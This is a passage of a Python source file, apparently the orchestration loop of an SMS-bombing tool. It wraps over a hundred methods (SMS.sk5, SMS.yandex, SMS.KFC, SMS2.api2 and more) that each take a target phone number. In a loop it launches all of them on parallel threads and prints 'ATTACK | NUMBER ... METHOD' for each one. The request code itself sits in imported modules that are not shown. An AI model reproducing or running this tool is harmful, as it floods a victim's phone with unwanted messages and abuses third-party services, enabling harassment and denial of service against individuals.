 #   print("ATTACK SMS '| METHOD : sk4")

def loop14():
    global num
    SMS.sk5(num)
 #   print("ATTACK SMS '| METHOD : sk5")

def loop15():
    global num
    SMS.sk6(num)
  #  print("ATTACK SMS '| METHOD : sk6")

def loop16():
    global num
    SMS.sk7(num)
 #   print("ATTACK SMS '| METHOD : sk7")

def loop17():
    global num
    SMS.sk8(num)
 #   print("ATTACK SMS '| METHOD : sk8")

def loop18():
    global num
    SMS.sk9(num)
 #   print("ATTACK SMS '| METHOD : sk9")

def loop19():
    global num
    SMS.sk10(num)
  #  print("ATTACK SMS '| METHOD : sk10")

def loop20():
    global num
    SMS.sk11(num)
  #  print("ATTACK SMS '| METHOD : sk11")


def loop22():
    global num
    SMS.sk12(num)
  #  print("ATTACK SMS '| METHOD : sk12")

def loop23():
    global num
    SMS.sk13(num)
  #  print("ATTACK SMS '| METHOD : sk13")

def loop24():
    global num
    SMS.sk14(num)
  #  print("ATTACK SMS '| METHOD : sk14")

def loop25():
    global num
    SMS.sk15(num)
   # print("ATTACK SMS '| METHOD : sk15")


def loop26():
    global num
    SMS.sk16(num)
 #   print("ATTACK SMS '| METHOD : sk16")


def loop27():
    global num
    SMS.sk17(num)
  #  print("ATTACK SMS '| METHOD : sk17")


def loop28():
    global num
    SMS.sk18(num)
  #  print("ATTACK SMS '| METHOD : sk18")


def loop29():
    global num
    SMS.sk19(num)
   # print("ATTACK SMS '| METHOD : sk19")


def loop30():
    global num
    SMS.sk20(num)
  #  print("ATTACK SMS '| METHOD : sk20")


def loop31():
    global num
    SMS.sk21(num)
   # print("ATTACK SMS '| METHOD : sk21")


def loop32():
    global num
    SMS.sk22(num)
  #  print("ATTACK SMS '| METHOD : sk22")


def loop33():
    global num
    SMS.sk23(num)
  #  print("ATTACK SMS '| METHOD : sk23")


def loop34():
    global num
    SMS.sk24(num)
  #  print("ATTACK SMS '| METHOD : sk24")


def loop35():
    global num
    SMS.sk25(num)
  #  print("ATTACK SMS '| METHOD : sk25")


def loop36():
    global num
    SMS.sk26(num)
  #  print("ATTACK SMS '| METHOD : sk26")


def loop37():
    global num
    SMS.sk27(num)
 #   print("ATTACK SMS '| METHOD : sk27")


def loop38():
    global num
    SMS.sk28(num)
 #   print("ATTACK SMS '| METHOD : sk28")


def loop39():
    global num
    SMS.sk29(num)
  #  print("ATTACK SMS '| METHOD : sk29")


def loop40():
    global num
    SMS.sk30(num)
  #  print("ATTACK SMS '| METHOD : sk30")


def loop41():
    global num
    SMS.sk31(num)
  #  print("ATTACK SMS '| METHOD : sk31")


def loop42():
    global num
    SMS.sk32(num)
  #  print("ATTACK SMS '| METHOD : sk32")




def loop44():
    global num
    SMS.p1112v2(num)
  #  print("ATTACK SMS '| METHOD : p1112v2")


def loop45():
    global num
    SMS.yandex(num)
 #   print("ATTACK SMS '| METHOD : yandex")


def loop46():
    global num
    SMS.okru(num)
  #  print("ATTACK SMS '| METHOD : okru")




def loop48():
    global num
    SMS.KFC(num)
 #   print("ATTACK SMS '| METHOD : KFC")


def loop49():
    global num
    SMS.icq(num)
  #  print("ATTACK SMS '| METHOD : icq")




def loop51():
    global num
    SMS.spam_pizza(num)
   # print("ATTACK SMS '| METHOD : spam_pizza")

def loop52():
    global num
    SMS.youla(num)
  #  print("ATTACK SMS '| METHOD : youla")



def loop54():
    global num
    SMS.Rapid(num)
  #  print("ATTACK SMS '| METHOD : Rapid")


def loop55():
    global num
    SMS.api1(num)

def loop56():
    global num
    SMS2.api2(num)

def loop57():
    global num
    SMS2.api3(num)

def loop58():
    global num
    SMS2.api4(num)

def loop59():
    global num
    SMS2.api5(num)

def loop60():
    global num
    SMS2.api6(num)

def loop61():
    global num
    SMS2.api7(num)

def loop62():
    global num
    SMS2.api8(num)

def loop63():
    global num
    SMS2.api9(num)

def loop64():
    global num
    SMS2.api10(num)

def loop65():
    global num
    SMS2.api11(num)

def loop66():
    global num
    SMS2.api12(num)

def loop67():
    global num
    SMS2.api13(num)

def loop68():
    global num
    SMS2.api14(num)

def loop69():
    global num
    SMS2.api15(num)

def loop70():
    global num
    SMS2.api16(num)



def loop72():
    global num
    SMS2.api18(num)

def loop73():
    global num
    SMS2.api19(num)

def loop74():
    global num
    SMS2.api20(num)

def loop75():
    global num
    SMS2.api21(num)

def loop76():
    global num
    SMS2.api22(num)

def loop77():
    global num
    SMS2.api23(num)


def loop78():
    global num
    SMS2.api24(num)

def loop79():
    global num
    SMS2.api25(num)

def loop80():
    global num
    SMS2.api26(num)

def loop81():
    global num
    SMS2.api27(num)

def loop82():
    global num
    SMS2.api28(num)

def loop83():
    global num
    SMS2.api29(num)

def loop84():
    global num
    SMS2.api30(num)

def loop85():
    global num
    SMS2.api31(num)

def loop86():
    global num
    SMS2.api32(num)

def loop87():
    global num
    SMS2.api33(num)

def loop88():
    global num
    SMS2.api34(num)

def loop89():
    global num
    SMS2.api35(num)

def loop90():
    global num
    SMS2.api36(num)

def loop91():
    global num
    SMS2.api37(num)

def loop92():
    global num
    SMS2.api38(num)

def loop93():
    global num
    SMS2.api39(num)

def loop94():
    global num
    SMS2.api40(num)

def loop95():
    global num
    SMS2.api41(num)

def loop96():
    global num
    SMS2.api42(num)

def loop97():
    global num
    SMS2.api43(num)

def loop98():
    global num
    SMS2.api44(num)


def loop100():
    global num
    SMS2.api46(num)

def loop101():
    global num
    SMS2.api47(num)

def loop102():
    global num
    SMS2.api48(num)

def loop103():
    global num
    SMS2.api49(num)

def loop104():
    global num
    SMS2.api50(num)

def loop105():
    global num
    SMS2.api51(num)

def loop106():
    global num
    SMS2.api52(num)

def loop107():
    global num
    SMS2.api53(num)

def loop108():
    global num
    SMS2.api54(num)

def loop109():
    global num
    SMS2.api55(num)

def loop110():
    global num
    SMS2.api56(num)

def loop111():
    global num
    SMS2.api57(num)

def loop112():
    global num
    SMS2.api58(num)

def loop113():
    global num
    SMS2.api59(num)

def loop113():
    global num
    SMS2.api60(num)

def loop114():
    global num
    SMS2.api61(num)

def loop54():
    global num
    SMS2.api62(num)


def loop115():
    global num
    SMS2.api63(num)

def loop116():
    global num
    SMS2.api64(num)

def loop117():
    global num
    SMS2.api65(num)

def loop118():
    global num
    SMS2.api66(num)

def loop119():
    global num
    SMS2.api67(num)

def loop120():
    global num
    SMS2.api68(num)


def loop121():
    global num
    SMS2.api69(num)


def loop122():
    global num
    SMS2.api70(num)


def loop123():
    global num
    SMS2.api71(num)


def loop124():
    global num
    SMS2.api72(num)


def loop125():
    global num
    SMS2.api73(num)


def loop126():
    global num
    SMS2.api74(num)


def loop127():
    global num
    SMS2.api75(num)


def loop128():
    global num
    SMS2.api76(num)

def loop129():
    global num
    SMS2.api77(num)





def loop131():
    global num
    SMS2.api79(num)

def loop132():
    global num
    SMS2.api80(num)

def loop133():
    global num
    SMS2.api81(num)


####----------------------------------------------------------------------------------------####















####----------------------------------------------------------------------------------------####

for i in range(n):
    time.sleep(0)
    threading.Thread(target=loop10).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 001 :')
    time.sleep(0)
    threading.Thread(target=loop11).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 002 :')
    time.sleep(0)
    threading.Thread(target=loop12).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 003 :')
    time.sleep(0)
    threading.Thread(target=loop13).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 004 :')
    time.sleep(0)
    threading.Thread(target=loop14).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 005 :')
    time.sleep(0)
    threading.Thread(target=loop15).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 006 :')
    time.sleep(0)
    threading.Thread(target=loop16).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 007 :')
    time.sleep(0)
    threading.Thread(target=loop18).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 008 :')
    time.sleep(0)
    threading.Thread(target=loop19).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 009 :')
    time.sleep(0)
    threading.Thread(target=loop20).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 010 :')
    time.sleep(0)
    threading.Thread(target=loop22).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 011 :')
    time.sleep(0)
    threading.Thread(target=loop23).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 012 :')
    time.sleep(0)
    threading.Thread(target=loop24).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 013 :')
    time.sleep(0)
    threading.Thread(target=loop25).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 014 :')
    time.sleep(0)
    threading.Thread(target=loop26).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 015 :')
    time.sleep(0)
    threading.Thread(target=loop27).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 016 :')
    time.sleep(0)
    threading.Thread(target=loop28).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 017 :')
    time.sleep(0)
    threading.Thread(target=loop29).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 018 :')
    time.sleep(0)
    threading.Thread(target=loop30).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 019 :')
    time.sleep(0)
    threading.Thread(target=loop31).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 020 :')
    time.sleep(0)
    threading.Thread(target=loop32).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 021 :')
    time.sleep(0)
    threading.Thread(target=loop33).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 022 :')
    time.sleep(0)
    threading.Thread(target=loop34).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 023 :')
    time.sleep(0)
    threading.Thread(target=loop35).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 024 :')
    time.sleep(0)
    threading.Thread(target=loop36).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 025 :')
    time.sleep(0)
    threading.Thread(target=loop37).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 026 :')
    time.sleep(0)
    threading.Thread(target=loop38).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 027 :')
    time.sleep(0)
    threading.Thread(target=loop39).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 028 :')
    time.sleep(0)
    threading.Thread(target=loop40).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 029 :')
    time.sleep(0)
    threading.Thread(target=loop41).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 030 :')
    time.sleep(0)
    threading.Thread(target=loop42).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 021 :')
    time.sleep(0)
    threading.Thread(target=loop44).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 032 :')
    time.sleep(0)
    threading.Thread(target=loop45).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 033 :')
    time.sleep(0)
    threading.Thread(target=loop46).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 034 :')
    time.sleep(0)
    threading.Thread(target=loop48).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 035 :')
    time.sleep(0)
    threading.Thread(target=loop49).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 036 :')
    time.sleep(0)
    threading.Thread(target=loop51).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 037 :')
    time.sleep(0)
    threading.Thread(target=loop52).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 038 :')
    time.sleep(0)
    threading.Thread(target=loop54).start()
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 039 :')
    threading.Thread(target=loop55).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 040 :')
    threading.Thread(target=loop56).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 041 :')
    threading.Thread(target=loop57).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 042 :')
    threading.Thread(target=loop58).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 043 :')
    threading.Thread(target=loop59).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 044 :')
    threading.Thread(target=loop60).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 045 :')
    threading.Thread(target=loop61).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 046 :')
    threading.Thread(target=loop62).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 047 :')
    threading.Thread(target=loop63).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 048 :')
    threading.Thread(target=loop64).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 049 :')
    threading.Thread(target=loop65).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 050 :')
    threading.Thread(target=loop66).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 051 :')
    threading.Thread(target=loop67).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 052 :')
    threading.Thread(target=loop68).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 053 :')
    threading.Thread(target=loop69).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 054 :')
    threading.Thread(target=loop70).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 055 :')
    threading.Thread(target=loop72).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 057 :')
    threading.Thread(target=loop73).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 058 :')
    threading.Thread(target=loop74).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 059 :')
    threading.Thread(target=loop75).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 060 :')
    threading.Thread(target=loop76).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 061 :')
    threading.Thread(target=loop77).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 062 :')
    threading.Thread(target=loop78).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 063 :')
    threading.Thread(target=loop79).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 064 :')
    threading.Thread(target=loop80).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 065 :')
    threading.Thread(target=loop81).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 066 :')
    threading.Thread(target=loop82).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 067 :')
    threading.Thread(target=loop83).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 068 :')
    threading.Thread(target=loop84).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 069 :')
    threading.Thread(target=loop85).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 070 :')
    threading.Thread(target=loop86).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 071 :')
    threading.Thread(target=loop87).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 072 :')
    threading.Thread(target=loop88).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 073 :')
    threading.Thread(target=loop89).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 074 :')
    threading.Thread(target=loop90).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 075 :')
    threading.Thread(target=loop91).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 076 :')
    threading.Thread(target=loop92).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 077 :')
    threading.Thread(target=loop93).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 078 :')
    threading.Thread(target=loop94).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 079 :')
    threading.Thread(target=loop95).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 080 :')
    threading.Thread(target=loop96).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 081 :')
    threading.Thread(target=loop97).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 082 :')
    threading.Thread(target=loop98).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 083 :')
    threading.Thread(target=loop100).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 085 :')
    threading.Thread(target=loop101).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 086 :')
    threading.Thread(target=loop102).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 087 :')
    threading.Thread(target=loop103).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 088 :')
    threading.Thread(target=loop104).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 089 :')
    threading.Thread(target=loop105).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 090 :')
    threading.Thread(target=loop106).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 091 :')
    threading.Thread(target=loop107).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 092 :')
    threading.Thread(target=loop108).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 093 :')
    threading.Thread(target=loop109).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 094 :')
    threading.Thread(target=loop110).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 095 :')
    threading.Thread(target=loop111).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 096 :')
    threading.Thread(target=loop112).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 097 :')
    threading.Thread(target=loop113).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 098 :')
    threading.Thread(target=loop114).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 099 :')
    threading.Thread(target=loop115).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 100 :')
    threading.Thread(target=loop116).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 101 :')
    threading.Thread(target=loop117).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 102 :')
    threading.Thread(target=loop118).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 103 :')
    threading.Thread(target=loop119).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 104 :')
    threading.Thread(target=loop120).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 105 :')
    threading.Thread(target=loop121).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 106 :')
    threading.Thread(target=loop122).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 107 :')
    threading.Thread(target=loop123).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 108 :')
    threading.Thread(target=loop124).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 109 :')
    threading.Thread(target=loop125).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 110 :')
    threading.Thread(target=loop126).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 111 :')
    threading.Thread(target=loop127).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 112 :')
    threading.Thread(target=loop128).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 113 :')
    threading.Thread(target=loop129).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 115 :')
    threading.Thread(target=loop131).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 116 :')
    threading.Thread(target=loop132).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 117 :')
    threading.Thread(target=loop133).start()
    time.sleep(0)
    print(f'{Fore.WHITE}ATTACK |'f'{Fore.GREEN} NUMBER : {num} :'f'{Fore.RED}  METHOD : 118 :')
    print(f"{Fore.YELLOW}XxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxX")
    
    
####----------------------------------------------------------------------------------------####
